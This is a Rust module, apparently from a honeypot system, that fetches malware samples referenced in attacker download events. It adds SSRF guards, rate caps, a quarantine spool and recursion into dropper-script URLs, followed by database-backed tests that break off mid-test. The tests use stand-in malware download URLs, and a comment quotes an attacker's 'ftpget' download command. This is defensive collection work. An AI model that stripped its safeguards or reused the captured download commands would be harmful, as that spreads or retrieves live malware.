pub mod extract;
pub mod guard;
pub mod http;
pub mod store;
pub mod tftp;
pub mod vbe;

use std::collections::HashSet;
use std::net::IpAddr;
use std::panic::AssertUnwindSafe;
use std::sync::Mutex;

use chrono::Utc;
use futures_util::FutureExt;
use sha2::{Digest, Sha256};
use sqlx::PgPool;
use tokio::sync::Semaphore;

use guard::HostResolver;
use http::FetchLimits;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum FetchStatus {
    Pending,
    Success,
    Dead,
    Rejected,
    TooBig,
    Timeout,
    Empty,
}

impl FetchStatus {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Pending => "pending",
            Self::Success => "success",
            Self::Dead => "dead",
            Self::Rejected => "rejected",
            Self::TooBig => "too_big",
            Self::Timeout => "timeout",
            Self::Empty => "empty",
        }
    }
}

/// Everything one `run_cycle` needs: the DB pool the `store` module reads/writes, the quarantine
/// spool captured bytes are written to, the SSRF-guard `own_ips` set and resolver every fetch is
/// vetted against, the shared byte/time limits, and the tunables that bound the fetcher's
/// blast radius - redirect hops per fetch, recursion depth into extracted dropper-script URLs,
/// fetches per host per hour, and fetches per UTC day. The last two are enforced in the
/// database (`store::claim_candidates`), so they hold across every node sharing it.
pub struct FetchDeps {
    pub pool: PgPool,
    pub spool: sensor_framework::QuarantineSpool,
    pub own_ips: HashSet<IpAddr>,
    pub limits: FetchLimits,
    pub resolver: std::sync::Arc<dyn HostResolver + Send + Sync>,
    pub max_hops: u8,
    pub max_depth: u8,
    pub per_host_hour: u32,
    pub daily_cap: u32,
}

/// Outcome counters for one `run_cycle` call - purely observational (logging/metrics), never
/// consulted to make a decision within the cycle itself.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct CycleStats {
    pub selected: usize,
    pub succeeded: usize,
    pub rejected: usize,
    pub too_big: usize,
    pub timeout: usize,
    pub empty: usize,
    pub dead: usize,
    pub skipped_bucket: usize,
    pub skipped_daily: usize,
    pub enqueued_children: usize,
    pub errors: usize,
}

/// Failed attempts (`rejected`/`too_big`/`timeout`/`empty`) at which a row is marked terminal
/// (`dead`) and excluded from `claim_candidates` forever after, regardless of `next_attempt`.
const MAX_ATTEMPTS: i32 = 3;

/// Fetches in flight at once within a single `run_cycle` call. Not part of `FetchDeps`: it
/// bounds this process's own resource usage (open sockets, buffered bytes), not an
/// operator-tunable fetch policy like `per_host_hour`.
const CONCURRENCY: usize = 8;

/// Backoff delay after the `attempts`-th failure (1-indexed): 5 min, then 20 min, doubling the
/// exponent each additional failure. Only ever called with `attempts < MAX_ATTEMPTS`, since the
/// `MAX_ATTEMPTS`-th failure goes straight to `dead` with no `next_attempt` at all.
fn backoff_delay(attempts: i32) -> chrono::Duration {
    let exp = (attempts - 1).clamp(0, 6);
    chrono::Duration::minutes(5i64 * 4i64.pow(exp as u32))
}

/// One fetch attempt's raw, scheme-agnostic result - the seam `run_cycle`'s orchestration
/// (dedup, backoff, bucket, spool, recursion) is driven through, mirroring `http.rs`'s
/// `HopFetcher` pattern. `RealFetcher` wires it to `guard::vet` + `fetch_http`/`fetch_tftp` for
/// production; tests substitute a scripted mock, since no address a hermetic test can bind a
/// listener to also clears `guard::vet`'s forbidden-address check (see `http.rs`'s redirect-loop
/// tests for the same constraint on the HTTP side) - there is no way to hermetically exercise a
/// real `Captured` outcome through the actual network path.
#[derive(Debug, Clone)]
enum RawOutcome {
    Captured {
        bytes: Vec<u8>,
        content_type: Option<String>,
        pinned_ip: Option<String>,
    },
    Failed {
        status: FetchStatus,
        reason: Option<String>,
    },
}

trait Fetcher {
    async fn fetch(&self, deps: &FetchDeps, candidate: &store::Candidate) -> RawOutcome;
}

/// The production `Fetcher`: dispatches by scheme. HTTP/HTTPS go through `fetch_http`, which
/// re-vets every redirect hop internally - it is never vetted here first. TFTP is vetted here
/// (`allow_tftp: true`) to obtain the `Pinned` target `fetch_tftp` requires, since TFTP has no
/// analogous internal re-vet loop of its own (it never redirects).
struct RealFetcher;

impl Fetcher for RealFetcher {
    async fn fetch(&self, deps: &FetchDeps, candidate: &store::Candidate) -> RawOutcome {
        match candidate.scheme.as_str() {
            "http" | "https" => match http::fetch_http(
                &candidate.url,
                &deps.own_ips,
                std::sync::Arc::clone(&deps.resolver),
                &deps.limits,
                deps.max_hops,
            )
            .await
            {
                Ok(http::HttpOutcome::Captured(f)) => RawOutcome::Captured {
                    bytes: f.bytes,
                    content_type: f.content_type,
                    pinned_ip: Some(f.pinned_ip.to_string()),
                },
                Ok(http::HttpOutcome::Rejected(r)) => RawOutcome::Failed {
                    status: FetchStatus::Rejected,
                    reason: Some(format!("{r:?}")),
                },
                Ok(http::HttpOutcome::Empty) => RawOutcome::Failed {
                    status: FetchStatus::Empty,
                    reason: Some("server returned an empty body".into()),
                },
                Ok(http::HttpOutcome::TooBig) => RawOutcome::Failed {
                    status: FetchStatus::TooBig,
                    reason: Some("body exceeds the fetch size limit".into()),
                },
                Ok(http::HttpOutcome::TooManyHops) => RawOutcome::Failed {
                    status: FetchStatus::Rejected,
                    reason: Some("too_many_hops".into()),
                },
                Err(e) => RawOutcome::Failed {
                    status: FetchStatus::Timeout,
                    reason: Some(e.to_string()),
                },
            },
            "tftp" => {
                let path = url::Url::parse(&candidate.url)
                    .map(|u| u.path().to_string())
                    .unwrap_or_default();
                match guard::vet_async(
                    &candidate.url,
                    &deps.own_ips,
                    std::sync::Arc::clone(&deps.resolver),
                    true,
                    deps.limits.dns_timeout,
                )
                .await
                {
                    Err(reject) => RawOutcome::Failed {
                        status: FetchStatus::Rejected,
                        reason: Some(format!("{reject:?}")),
                    },
                    Ok(pinned) => match tftp::fetch_tftp(&pinned, &path, &deps.limits).await {
                        Ok(tftp::TftpOutcome::Captured(bytes)) => RawOutcome::Captured {
                            bytes,
                            content_type: None,
                            pinned_ip: Some(pinned.ip.to_string()),
                        },
                        // Every failure carries text, not just the ones that started with it:
                        // `reject_reason` is the only record of WHY, and the console shows it
                        // beside the status. A row reading "dead" with nothing after it left an
                        // operator no way to tell a refused transfer from an absent server.
                        Ok(tftp::TftpOutcome::Empty) => RawOutcome::Failed {
                            status: FetchStatus::Empty,
                            reason: Some("server sent an empty file".into()),
                        },
                        Ok(tftp::TftpOutcome::TooBig) => RawOutcome::Failed {
                            status: FetchStatus::TooBig,
                            reason: Some("file exceeds the fetch size limit".into()),
                        },
                        Ok(tftp::TftpOutcome::Oack) => RawOutcome::Failed {
                            status: FetchStatus::Rejected,
                            reason: Some(
                                "server answered OACK, which this client does not use".into(),
                            ),
                        },
                        Ok(tftp::TftpOutcome::Timeout) => RawOutcome::Failed {
                            status: FetchStatus::Timeout,
                            reason: Some("no response from the TFTP server".into()),
                        },
                        Err(e) => RawOutcome::Failed {
                            status: FetchStatus::Timeout,
                            reason: Some(e.to_string()),
                        },
                    },
                }
            }
            other => RawOutcome::Failed {
                status: FetchStatus::Rejected,
                reason: Some(format!("unsupported_scheme:{other}")),
            },
        }
    }
}

/// Run one selection+fetch cycle against the real network (`RealFetcher`). See `run_cycle_with`
/// for the orchestration itself.
pub async fn run_cycle(deps: &FetchDeps, batch: usize) -> CycleStats {
    run_cycle_with(deps, batch, &RealFetcher).await
}

/// Allowance for the non-network work one candidate does after its fetch returns: the spool
/// write and the outcome/children writes to the database.
const PER_CANDIDATE_OVERHEAD: std::time::Duration = std::time::Duration::from_secs(30);

/// Extra lease beyond the computed worst case, for scheduling jitter and clock skew between the
/// database and this process.
const LEASE_MARGIN: std::time::Duration = std::time::Duration::from_secs(60);

/// How long a claim must hold so no other node can take a row while this cycle may still be
/// processing it. Worst case per candidate is every redirect hop (`max_hops + 1` of them) spending
/// its full DNS timeout and full total timeout, plus the local overhead; candidates run
/// `CONCURRENCY` at a time, so the last of `batch` starts after `ceil(batch / CONCURRENCY) - 1`
/// full waves.
fn claim_lease(limits: &FetchLimits, max_hops: u8, batch: usize) -> std::time::Duration {
    let per_hop = limits.dns_timeout + limits.total_timeout;
    let per_candidate = per_hop * (u32::from(max_hops) + 1) + PER_CANDIDATE_OVERHEAD;
    let waves = batch.div_ceil(CONCURRENCY).max(1) as u32;
    per_candidate * waves + LEASE_MARGIN
}

/// Claim up to `batch` candidates within the shared per-host and daily budgets (see
/// `store::claim_candidates`) and process them with bounded concurrency: dispatch through
/// `fetcher`, then record the outcome (spool + upsert on success, backoff-or-terminal upsert on
/// failure) and, on a successful capture still under `max_depth`, enqueue any URLs
/// `extract::extract_urls` finds in the body as depth+1 pending rows. Every candidate's processing
/// is isolated behind `catch_unwind`, so one panicking or erroring URL never aborts the rest of
/// the batch; a candidate that panics before its outcome is recorded keeps its claim until the
/// lease lapses and is then retried.
async fn run_cycle_with<F: Fetcher>(deps: &FetchDeps, batch: usize, fetcher: &F) -> CycleStats {
    let stats = Mutex::new(CycleStats::default());

    let limits = store::ClaimLimits {
        batch: batch as i64,
        per_host_hour: i64::from(deps.per_host_hour),
        daily_cap: i64::from(deps.daily_cap),
        lease: claim_lease(&deps.limits, deps.max_hops, batch),
    };
    let claim = match store::claim_candidates(&deps.pool, limits).await {
        Ok(c) => c,
        Err(e) => {
            tracing::error!(error = %e, "fetcher: claim_candidates failed, fetching nothing this cycle");
            stats.lock().unwrap().errors += 1;
            return stats.into_inner().unwrap();
        }
    };
    {
        let mut s = stats.lock().unwrap();
        s.selected = claim.candidates.len() + claim.skipped_bucket + claim.skipped_daily;
        s.skipped_bucket = claim.skipped_bucket;
        s.skipped_daily = claim.skipped_daily;
    }
    let candidates = claim.candidates;
    if candidates.is_empty() {
        return stats.into_inner().unwrap();
    }

    let semaphore = Semaphore::new(CONCURRENCY);

    let tasks = candidates.iter().map(|candidate| {
        let sem = &semaphore;
        let stats = &stats;
        async move {
            let Ok(_permit) = sem.acquire().await else {
                return;
            };
            let outcome = AssertUnwindSafe(process_one(deps, fetcher, candidate, stats))
                .catch_unwind()
                .await;
            if outcome.is_err() {
                tracing::error!(url = %candidate.url, "fetcher: candidate processing panicked, isolated");
                stats.lock().unwrap().errors += 1;
            }
        }
    });
    futures_util::future::join_all(tasks).await;

    stats.into_inner().unwrap()
}

async fn process_one<F: Fetcher>(
    deps: &FetchDeps,
    fetcher: &F,
    candidate: &store::Candidate,
    stats: &Mutex<CycleStats>,
) {
    match fetcher.fetch(deps, candidate).await {
        RawOutcome::Captured {
            bytes,
            content_type,
            pinned_ip,
        } if !bytes.is_empty() => {
            record_success(deps, candidate, bytes, content_type, pinned_ip, stats).await;
        }
        // Defense in depth: production never produces this (both HttpOutcome and TftpOutcome
        // have their own explicit Empty variant, mapped above before this ever runs), but a
        // zero-byte body must never reach the spool regardless of which layer detected it.
        RawOutcome::Captured { .. } => {
            record_failure(deps, candidate, FetchStatus::Empty, None, stats).await;
        }
        RawOutcome::Failed { status, reason } => {
            record_failure(deps, candidate, status, reason, stats).await;
        }
    }
}

async fn record_success(
    deps: &FetchDeps,
    candidate: &store::Candidate,
    bytes: Vec<u8>,
    content_type: Option<String>,
    pinned_ip: Option<String>,
    stats: &Mutex<CycleStats>,
) {
    let sha = Sha256::digest(&bytes).to_vec();

    if let Err(e) = deps.spool.store(&bytes) {
        tracing::warn!(url = %candidate.url, error = ?e, "fetcher: spool store failed, recording as a failed attempt");
        record_failure(
            deps,
            candidate,
            FetchStatus::Timeout,
            Some(format!("spool: {e:?}")),
            stats,
        )
        .await;
        return;
    }

    let result = store::AttemptResult {
        url_hash: candidate.url_hash.clone(),
        url: candidate.url.clone(),
        host: candidate.host.clone(),
        scheme: candidate.scheme.clone(),
        port: candidate.port,
        source_ip: candidate.source_ip,
        parent_hash: candidate.parent_hash.clone(),
        depth: candidate.depth,
        status: FetchStatus::Success,
        reject_reason: None,
        sha256: Some(sha),
        bytes: Some(bytes.len() as i32),
        content_type,
        pinned_ip,
        attempts: candidate.attempts,
        next_attempt: None,
    };
    if let Err(e) = store::upsert_attempt(&deps.pool, &result).await {
        tracing::error!(url = %candidate.url, error = %e, "fetcher: failed to record a successful attempt");
        stats.lock().unwrap().errors += 1;
        return;
    }
    stats.lock().unwrap().succeeded += 1;

    if candidate.depth < deps.max_depth as i32 {
        for child_url in extract::extract_urls(&bytes) {
            let Some((scheme, host, port)) = store::parse_url_parts(&child_url) else {
                continue;
            };
            let child = store::NewPendingRow {
                url_hash: store::url_hash(&child_url),
                url: child_url,
                host,
                scheme,
                port,
                source_ip: candidate.source_ip,
                parent_hash: Some(candidate.url_hash.clone()),
                depth: candidate.depth + 1,
            };
            // `insert_pending_if_absent`, never `upsert_attempt`: a child url that already has a
            // row - at any status - must be left completely untouched. Using an upsert here is
            // exactly what let a script cycle (A references B, B references A) or a script that
            // re-lists an already-`dead`/`success` url reset that row back to a fresh `pending`
            // depth-0-relative-to-nothing state, defeating both the recursion depth cap and the
            // terminal-after-3-attempts guarantee.
            match store::insert_pending_if_absent(&deps.pool, &child).await {
                Ok(true) => stats.lock().unwrap().enqueued_children += 1,
                Ok(false) => {}
                Err(e) => {
                    tracing::warn!(error = %e, "fetcher: failed to enqueue a recursion child url")
                }
            }
        }
    }
}

async fn record_failure(
    deps: &FetchDeps,
    candidate: &store::Candidate,
    outcome_status: FetchStatus,
    reason: Option<String>,
    stats: &Mutex<CycleStats>,
) {
    let attempts = candidate.attempts + 1;
    let (status, next_attempt) = if attempts >= MAX_ATTEMPTS {
        (FetchStatus::Dead, None)
    } else {
        (outcome_status, Some(Utc::now() + backoff_delay(attempts)))
    };

    let result = store::AttemptResult {
        url_hash: candidate.url_hash.clone(),
        url: candidate.url.clone(),
        host: candidate.host.clone(),
        scheme: candidate.scheme.clone(),
        port: candidate.port,
        source_ip: candidate.source_ip,
        parent_hash: candidate.parent_hash.clone(),
        depth: candidate.depth,
        status,
        reject_reason: reason,
        sha256: None,
        bytes: None,
        content_type: None,
        pinned_ip: None,
        attempts,
        next_attempt,
    };
    if let Err(e) = store::upsert_attempt(&deps.pool, &result).await {
        tracing::error!(url = %candidate.url, error = %e, "fetcher: failed to record a failed attempt");
        stats.lock().unwrap().errors += 1;
        return;
    }

    let mut s = stats.lock().unwrap();
    match status {
        FetchStatus::Dead => s.dead += 1,
        FetchStatus::Rejected => s.rejected += 1,
        FetchStatus::TooBig => s.too_big += 1,
        FetchStatus::Timeout => s.timeout += 1,
        FetchStatus::Empty => s.empty += 1,
        FetchStatus::Pending | FetchStatus::Success => {}
    }
}

/// DB-backed `run_cycle` orchestration tests: dedup/sync, reject/spool, backoff/terminal,
/// per-host bucket, recursion depth cap, empty-body handling, and panic isolation.
///
/// Shares the persistent `propolis_test` database with other crates' tests (see
/// `queue_test.rs`/`gatekeeper_test.rs`'s module docs for the same convention). Because
/// `claim_candidates` is deliberately GLOBAL - it selects across the whole `fetch_attempt`
/// table, not scoped to any one test - these tests MUST run serially:
/// `cargo test -p review --lib fetcher::orchestration_tests -- --test-threads=1`. Run in
/// parallel, one test's `reset_all` wipe (or its `run_cycle_with` call, which can select rows
/// another concurrently-running test just inserted) races another test's fixtures and produces
/// spurious counts - verified empirically (three consecutive default-parallelism runs each
/// failed with different, non-reproducible mismatched counts; three consecutive
/// `--test-threads=1` runs were all clean). `--test-threads=1` is required for this crate's
/// existing DB-backed integration tests for the identical reason.
#[cfg(test)]
mod orchestration_tests {
    use super::*;
    use std::collections::{HashMap, HashSet};
    use std::net::IpAddr;

    use chrono::Utc;
    use core_scoring::{EventInput, Protocol, SignalType, append_event};
    use sha2::{Digest, Sha256};
    use sqlx::PgPool;
    use tempfile::TempDir;

    use crate::fetcher::guard::HostResolver;
    use crate::fetcher::http::FetchLimits;

    async fn test_pool() -> PgPool {
        let url = std::env::var("DATABASE_URL")
            .unwrap_or_else(|_| "postgres://propolis:propolis@localhost:5432/propolis_test".into());
        let pool = PgPool::connect(&url).await.unwrap();
        sqlx::migrate!("../core-scoring/migrations")
            .run(&pool)
            .await
            .unwrap();
        crate::migrator().run(&pool).await.unwrap();
        pool
    }

    /// Wipes every row this whole test suite could have left behind, from THIS run or a prior
    /// one - not just the calling test's own host. `propolis_test` is a persistent shared
    /// database (matches `queue_test.rs`'s `reset_ip` convention), and `claim_candidates` is
    /// deliberately GLOBAL (it has to be, to serve the whole table each cycle) - so a row any
    /// other test in this file leaves non-terminal (still `pending`, or backed off with an
    /// elapsed `next_attempt`) is visible to every later `claim_candidates` call in the same
    /// process, not just its own test. Two concrete leaks this closes: the per-host-bucket test
    /// intentionally leaves 40 of its 50 rows `pending` (only `per_host_hour` get attempted),
    /// and the panic-isolation test's "boom" row never reaches an upsert at all (the panic fires
    /// before `record_failure`/`record_success` runs), so it too stays `pending` forever. Both
    /// are exactly the kind of row a later test's own `claim_candidates` batch would otherwise
    /// scoop up ahead of its own freshly-seeded one (`ORDER BY first_seen` sorts the older,
    /// leaked-in row first). The shared daily-usage counter is cleared too, so one test's
    /// charges never leave the next with less daily budget than it set up. Called at the start
    /// of every test so each is self-contained regardless of run order or which tests ran
    /// before it.
    async fn reset_all(pool: &PgPool) {
        sqlx::query("DELETE FROM fetch_attempt WHERE host LIKE 'fetch8%.example'")
            .execute(pool)
            .await
            .unwrap();
        sqlx::query("DELETE FROM event WHERE source_ip::text LIKE '203.0.113.%'")
            .execute(pool)
            .await
            .unwrap();
        sqlx::query("DELETE FROM fetch_daily_usage")
            .execute(pool)
            .await
            .unwrap();
    }

    /// The rows a claim would hand out, with a zero lease so they stay claimable afterwards -
    /// for tests that check selection (sync, ordering, eligibility) rather than coordination.
    async fn claim_unleased(pool: &PgPool, batch: i64) -> Vec<store::Candidate> {
        store::claim_candidates(
            pool,
            store::ClaimLimits {
                batch,
                per_host_hour: i64::MAX,
                daily_cap: i64::MAX,
                lease: std::time::Duration::ZERO,
            },
        )
        .await
        .unwrap()
        .candidates
    }

    fn download_event(ip: &str, sensor: &str, url: &str, ts: &str) -> EventInput {
        EventInput::from_signal(
            ip.parse().unwrap(),
            None,
            sensor.into(),
            SignalType::HoneypotFileDownload,
            Protocol::Tcp,
            true,
            ts.parse().unwrap(),
            serde_json::json!({ "url": url }),
            None,
        )
    }

    struct DummyResolver;
    impl HostResolver for DummyResolver {
        fn resolve(&self, _host: &str) -> std::io::Result<Vec<IpAddr>> {
            panic!("orchestration tests never dispatch through the real resolver/fetch path")
        }
    }

    fn test_limits() -> FetchLimits {
        FetchLimits {
            max_bytes: 10_000_000,
            connect_timeout: std::time::Duration::from_secs(1),
            read_timeout: std::time::Duration::from_secs(1),
            total_timeout: std::time::Duration::from_secs(1),
            user_agent: "propolis-fetcher-test".into(),
            dns_timeout: std::time::Duration::from_secs(1),
        }
    }

    fn test_deps(pool: PgPool, spool_dir: &TempDir, per_host_hour: u32) -> FetchDeps {
        FetchDeps {
            pool,
            spool: sensor_framework::QuarantineSpool::new(
                spool_dir.path().to_path_buf(),
                10_000_000,
                1_000_000_000,
            ),
            own_ips: HashSet::new(),
            limits: test_limits(),
            resolver: std::sync::Arc::new(DummyResolver),
            max_hops: 3,
            max_depth: 2,
            per_host_hour,
            daily_cap: 1_000_000,
        }
    }

    /// A scripted [`Fetcher`] test double: returns a fixed outcome per exact URL (or a shared
    /// default for a whole batch), and can be told to panic for one URL to prove `run_cycle`
    /// isolates a per-candidate panic rather than aborting the whole batch. Panics on an
    /// unscripted, non-defaulted URL - a loop bug that fetches something unexpected shows up as a
    /// test failure rather than silently passing (matches `http.rs`'s `MockHopFetcher`).
    struct MockFetcher {
        scripted: HashMap<String, RawOutcome>,
        default: Option<RawOutcome>,
        panic_on: HashSet<String>,
    }

    impl MockFetcher {
        fn new() -> Self {
            Self {
                scripted: HashMap::new(),
                default: None,
                panic_on: HashSet::new(),
            }
        }
        fn on(mut self, url: &str, outcome: RawOutcome) -> Self {
            self.scripted.insert(url.to_string(), outcome);
            self
        }
        fn default_outcome(mut self, outcome: RawOutcome) -> Self {
            self.default = Some(outcome);
            self
        }
        fn panic_on_url(mut self, url: &str) -> Self {
            self.panic_on.insert(url.to_string());
            self
        }
    }

    impl Fetcher for MockFetcher {
        async fn fetch(&self, _deps: &FetchDeps, candidate: &store::Candidate) -> RawOutcome {
            if self.panic_on.contains(&candidate.url) {
                panic!("scripted panic for {}", candidate.url);
            }
            self.scripted
                .get(&candidate.url)
                .cloned()
                .or_else(|| self.default.clone())
                .unwrap_or_else(|| panic!("unscripted url in MockFetcher: {}", candidate.url))
        }
    }

    // (a) a honeypot_file_download event with a public-resolving URL -> spool gets the sample,
    // fetch_attempt.status='success'.
    #[tokio::test]
    async fn captured_body_is_spooled_and_recorded_success() {
        let pool = test_pool().await;
        let host = "fetch8a.example";
        let ip = "203.0.113.10";
        let url = format!("http://{host}/mal.bin");
        reset_all(&pool).await;

        append_event(
            &pool,
            download_event(ip, "sensor-a", &url, "2026-08-22T00:00:00Z"),
        )
        .await
        .unwrap();

        let spool_dir = TempDir::new().unwrap();
        let deps = test_deps(pool.clone(), &spool_dir, 100);
        let bytes = b"totally-a-malware-sample".to_vec();
        let fetcher = MockFetcher::new().on(
            &url,
            RawOutcome::Captured {
                bytes: bytes.clone(),
                content_type: Some("application/octet-stream".into()),
                pinned_ip: Some("93.184.216.34".into()),
            },
        );

        let stats = run_cycle_with(&deps, 10, &fetcher).await;
        assert_eq!(stats.succeeded, 1);

        let row = sqlx::query(
            "SELECT status, sha256, bytes, content_type, pinned_ip, attempts \
             FROM fetch_attempt WHERE url_hash = $1",
        )
        .bind(store::url_hash(&url))
        .fetch_one(&pool)
        .await
        .unwrap();
        use sqlx::Row;
        let status: String = row.get("status");
        let sha256: Vec<u8> = row.get("sha256");
        let stored_bytes: i32 = row.get("bytes");
        let content_type: String = row.get("content_type");
        let pinned_ip: String = row.get("pinned_ip");
        assert_eq!(status, "success");
        assert_eq!(sha256, Sha256::digest(&bytes).to_vec());
        assert_eq!(stored_bytes, bytes.len() as i32);
        assert_eq!(content_type, "application/octet-stream");
        assert_eq!(pinned_ip, "93.184.216.34");

        let hex = to_hex(&sha256);
        let spooled = spool_dir.path().join(&hex);
        assert!(spooled.exists(), "spool file {hex} was not written");
        assert_eq!(std::fs::read(&spooled).unwrap(), bytes);
    }

    // The attacker attribution on every fetch_attempt row was silently NULL in production:
    // Postgres renders `inet` as "1.2.3.4/32" even for a plain address, so the old
    // `source_ip::text` + `.parse::<IpAddr>().ok()` always failed the parse and the `.ok()`
    // swallowed it, writing NULL. That severed every IP -> fetched-malware link. `host()` emits
    // the bare address. This test fails against the `::text` spelling and passes with `host()`.
    #[tokio::test]
    async fn synced_rows_carry_the_reporting_attacker_ip() {
        let pool = test_pool().await;
        let ip = "203.0.113.77";
        reset_all(&pool).await;

        let url = "http://fetch8z.example/payload.bin".to_string();
        append_event(
            &pool,
            download_event(ip, "sensor-a", &url, "2026-08-31T00:00:00Z"),
        )
        .await
        .unwrap();

        let candidates = claim_unleased(&pool, 100).await;
        let candidate = candidates
            .iter()
            .find(|c| c.url == url)
            .expect("the synced url must be selectable");
        assert_eq!(
            candidate.source_ip,
            Some(ip.parse().unwrap()),
            "the reporting attacker ip must survive the round trip, not be silently dropped to None"
        );

        let stored: Option<String> =
            sqlx::query_scalar("SELECT host(source_ip) FROM fetch_attempt WHERE url = $1")
                .bind(&url)
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(
            stored.as_deref(),
            Some(ip),
            "fetch_attempt.source_ip must be persisted, not NULL"
        );
    }

    // Fix round 2 (minor): a scheme RealFetcher cannot dispatch (ftp - real capture: the shell
    // sensor logs an `ftpget ftp://...` command as a honeypot_file_download event with the
    // ftp:// url verbatim) must never get a fetch_attempt row at all - it can only ever end up
    // Rejected("unsupported_scheme"), burning a backoff cycle and a daily-cap/per-host-bucket
    // slot for something that will never be fetched. sync_new_events must skip it outright,
    // while still syncing the schemes the fetcher actually handles.
    #[tokio::test]
    async fn sync_skips_unsupported_schemes_but_still_syncs_supported_ones() {
        let pool = test_pool().await;
        let ip = "203.0.113.14";
        reset_all(&pool).await;

        let ftp_url = "ftp://fetch8m.example/mal.bin".to_string();
        let http_url = "http://fetch8n.example/mal.bin".to_string();
        let tftp_url = "tftp://fetch8o.example/mal.bin".to_string();

        append_event(
            &pool,
            download_event(ip, "sensor-m", &ftp_url, "2026-08-22T00:00:00Z"),
        )
        .await
        .unwrap();
        append_event(
            &pool,
            download_event(ip, "sensor-n", &http_url, "2026-08-22T00:00:01Z"),
        )
        .await
        .unwrap();
        append_event(
            &pool,
            download_event(ip, "sensor-o", &tftp_url, "2026-08-22T00:00:02Z"),
        )
        .await
        .unwrap();

        let candidates = claim_unleased(&pool, 100).await;
        assert!(
            !candidates.iter().any(|c| c.url == ftp_url),
            "an unsupported scheme must never be selected"
        );
        assert!(
            candidates.iter().any(|c| c.url == http_url),
            "http must still sync as before"
        );
        assert!(
            candidates.iter().any(|c| c.url == tftp_url),
            "tftp must still sync as before"
        );

        let ftp_row_count: i64 =
            sqlx::query_scalar("SELECT COUNT(*) FROM fetch_attempt WHERE url = $1")
                .bind(&ftp_url)
                .fetch_one(&pool)
                .await
                .unwrap();
        assert_eq!(
            ftp_row_count, 0,
            "no fetch_attempt row must ever exist for an unsupported scheme - it must never \
             consume backoff/budget cycling toward dead"
        );
    }

    // (b) a forbidden URL -> status='rejected', reject_reason set, no spool write.
    #[tokio::test]
    async fn rejected_url_is_recorded_with_no_spool_write() {
        let pool = test_pool().await;
        let host = "fetch8b.example";
        let ip = "203.0.113.11";
        let url = format!("http://{host}/x");
        reset_all(&pool).await;

        append_event(
            &pool,
            download_event(ip, "sensor-b", &url, "2026-08-22T00:00:00Z"),
        )
        .await
        .unwrap();

        let spool_dir = TempDir::new().unwrap();
        let deps = test_deps(pool.clone(), &spool_dir, 100);
        let fetcher = MockFetcher::new().on(
            &url,
            RawOutcome::Failed {
                status: FetchStatus::Rejected,
                reason: Some("Forbidden(Reserved)".into()),
            },
        );

        let stats = run_cycle_with(&deps, 10, &fetcher).await;
        assert_eq!(stats.rejected, 1);

        use sqlx::Row;
        let row = sqlx::query(
            "SELECT status, reject_reason, sha256, attempts, next_attempt \
             FROM fetch_attempt WHERE url_hash = $1",
        )
        .bind(store::url_hash(&url))
        .fetch_one(&pool)
        .await
        .unwrap();
        let status: String = row.get("status");
        let reject_reason: Option<String> = row.get("reject_reason");
        let sha256: Option<Vec<u8>> = row.get("sha256");
        let attempts: i32 = row.get("attempts");
        let next_attempt: Option<chrono::DateTime<Utc>> = row.get("next_attempt");
        assert_eq!(status, "rejected");
        assert!(reject_reason.is_some());
        assert!(sha256.is_none());
        assert_eq!(attempts, 1);
        assert!(next_attempt.is_some());

        // Directory holds nothing: never wrote a sample for a rejected fetch.
        let entries: Vec<_> = std::fs::read_dir(spool_dir.path()).unwrap().collect();
        assert!(entries.is_empty());
    }

    // (c) a failed URL writes a backoff row and is not re-selected before next_attempt; terminal
    // after 3 attempts.
    #[tokio::test]
    async fn backoff_row_is_not_reselected_early_and_goes_terminal_after_three() {
        let pool = test_pool().await;
        let host = "fetch8c.example";
        let url = format!("http://{host}/y");
        reset_all(&pool).await;

        store::upsert_attempt(
            &pool,
            &store::AttemptResult {
                url_hash: store::url_hash(&url),
                url: url.clone(),
                host: host.to_string(),
                scheme: "http".into(),
                port: Some(80),
                source_ip: None,
                parent_hash: None,
                depth: 0,
                status: FetchStatus::Pending,
                reject_reason: None,
                sha256: None,
                bytes: None,
                content_type: None,
                pinned_ip: None,
                attempts: 0,
                next_attempt: None,
            },
        )
        .await
        .unwrap();

        let spool_dir = TempDir::new().unwrap();
        let deps = test_deps(pool.clone(), &spool_dir, 100);
        let fetcher = MockFetcher::new().on(
            &url,
            RawOutcome::Failed {
                status: FetchStatus::Rejected,
                reason: Some("boom".into()),
            },
        );

        async fn attempts_and_status(pool: &PgPool, url: &str) -> (i32, String) {
            use sqlx::Row;
            let row = sqlx::query("SELECT attempts, status FROM fetch_attempt WHERE url_hash = $1")
                .bind(store::url_hash(url))
                .fetch_one(pool)
                .await
                .unwrap();
            (row.get("attempts"), row.get("status"))
        }
        async fn expire_backoff(pool: &PgPool, url: &str) {
            sqlx::query(
                "UPDATE fetch_attempt SET next_attempt = now() - interval '1 minute' \
                 WHERE url_hash = $1",
            )
            .bind(store::url_hash(url))
            .execute(pool)
            .await
            .unwrap();
        }

        // 1st cycle: selected, fails, attempts=1, backed off into the future.
        run_cycle_with(&deps, 10, &fetcher).await;
        let (attempts, status) = attempts_and_status(&pool, &url).await;
        assert_eq!((attempts, status.as_str()), (1, "rejected"));

        // 2nd cycle, immediately: next_attempt is still in the future -> not reselected.
        run_cycle_with(&deps, 10, &fetcher).await;
        let (attempts, _) = attempts_and_status(&pool, &url).await;
        assert_eq!(attempts, 1, "must not be reselected before next_attempt");

        // Expire the backoff, retry -> attempts=2.
        expire_backoff(&pool, &url).await;
        run_cycle_with(&deps, 10, &fetcher).await;
        let (attempts, status) = attempts_and_status(&pool, &url).await;
        assert_eq!((attempts, status.as_str()), (2, "rejected"));

        // Expire again, retry a 3rd time -> terminal (dead).
        expire_backoff(&pool, &url).await;
        run_cycle_with(&deps, 10, &fetcher).await;
        let (attempts, status) = attempts_and_status(&pool, &url).await;
        assert_eq!((attempts, status.as_str()), (3, "dead"));

        // Dead is never reselected again, regardless of next_attempt (which is NULL here).
        run_cycle_with(&deps, 10, &fetcher).await;
        let (attempts, status) = attempts_and_status(&pool, &url).await;
        assert_eq!((attempts, status.as_str()), (3, "dead"));
    }

    // (d) 50 URLs on one host -> at most per_host_hour fetched.
    #[tokio::test]
    async fn per_host_hourly_bucket_caps_fetches() {
        let pool = test_pool().await;
        let host = "fetch8d.example";
        reset_all(&pool).await;

        for i in 0..50 {
            let url = format!("http://{host}/f{i}");
            store::upsert_attempt(
                &pool,
                &store::AttemptResult {
                    url_hash: store::url_hash(&url),
                    url,
